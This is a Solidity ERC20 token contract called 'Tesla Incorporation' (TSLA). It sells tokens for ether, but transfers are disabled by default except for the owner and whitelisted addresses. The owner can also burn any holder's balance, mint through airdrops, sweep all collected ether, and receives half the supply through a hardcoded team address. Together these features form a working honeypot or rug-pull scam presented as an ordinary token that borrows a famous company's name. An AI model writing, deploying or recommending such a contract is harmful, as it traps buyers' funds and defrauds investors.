// SPDX-License-Identifier: MIT

pragma solidity ^0.4.26;

 interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if (a == 0) {
            return 0;
        }
        c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        // uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }


    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        assert(c >= a);
        return c;
    }
}



contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}

contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TSLA is ERC20 {
    
    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public whitelistedAddresses;
    
    bool public transfersEnabled = false; 

    string public constant name = "Tesla Incorporation";
    string public constant symbol = "TSLA";
    uint public constant decimals = 9;
    
    uint256 public totalSupply = 3330000000e9;
    uint256 public totalDistributed;
    uint256 public constant requestMinimum = 0.001 ether / 1000;
    uint256 public tokensPerEth = 6055000000;


    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Airdrop(address indexed _owner, uint _amount, uint _balance);
    event TokensPerEthUpdated(uint _tokensPerEth);
    event Burn(address indexed burner, uint256 value);
    event TransfersEnabled();
    event TransfersDisabled();
    event AddressWhitelisted(address indexed _address);
    event AddressRemovedFromWhitelist(address indexed _address);


    bool public distributionFinished = false;
    
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier transfersAllowed(address _from) {
        require(
            transfersEnabled || 
            msg.sender == owner || 
            whitelistedAddresses[_from] || 
            whitelistedAddresses[msg.sender] ||
            msg.sender == address(this),
            "Transfers are currently disabled"
        );
        _;
    }
    
    constructor() public {
        uint256 teamFund = 1665000000e9;
        owner = msg.sender;
        distr(0x6F4DcAE0dA3aead77995df53f35B13fa9afF4592, teamFund);
    }
    
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    
    function enableTransfers() onlyOwner public {
        transfersEnabled = true;
        emit TransfersEnabled();
    }
    
    function disableTransfers() onlyOwner public {
        transfersEnabled = false;
        emit TransfersDisabled();
    }
    
    function addToWhitelist(address _address) onlyOwner public {
        require(_address != address(0), "Cannot whitelist zero address");
        whitelistedAddresses[_address] = true;
        emit AddressWhitelisted(_address);
    }
    
    function removeFromWhitelist(address _address) onlyOwner public {
        whitelistedAddresses[_address] = false;
        emit AddressRemovedFromWhitelist(_address);
    }
    
    function isWhitelisted(address _address) public view returns (bool) {
        return whitelistedAddresses[_address];
    }

    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);

        return true;
    }
    
    function Distribute(address _participant, uint _amount) onlyOwner internal {

        require( _amount > 0 );      
        require( totalDistributed < totalSupply );
        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        // log
        emit Airdrop(_participant, _amount, balances[_participant]);
        emit Transfer(address(0), _participant, _amount);
    }
    
    function DistributeAirdrop(address _participant, uint _amount) onlyOwner external {        
        Distribute(_participant, _amount);
    }

    function DistributeAirdropMultiple(address[] _addresses, uint _amount) onlyOwner external {        
        for (uint i = 0; i < _addresses.length; i++) Distribute(_addresses[i], _amount);
    }

    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }
           
    function () external payable {
        getTokens();
     }

    function getTokens() payable canDistr public {
        uint256 tokens = 0;
        address investor = msg.sender;

        // Calculate base token amount
        tokens = tokensPerEth.mul(msg.value).div(1 ether);

        // If tokens > 0, distribute
        if (tokens > 0 && msg.value >= requestMinimum) {
            distr(investor, tokens);
        } else {
            require(msg.value >= requestMinimum);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    modifier onlyPayloadSize(uint size) {
        require(msg.data.length >= size + 4, "Invalid payload size");
        _;
    }
    
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) transfersAllowed(msg.sender) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) transfersAllowed(_from) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    
    function withdrawAll() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }

    function withdraw(uint256 _wdamount) onlyOwner public {
        uint256 wantAmount = _wdamount;
        owner.transfer(wantAmount);
    }

    function burn(address _from, uint256 _value) onlyOwner public {
        require(_value <= balances[_from], "Insufficient balance to burn");
        balances[_from] = balances[_from].sub(_value);
        totalSupply = totalSupply.sub(_value);
        emit Burn(_from, _value);
    }
    
    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}















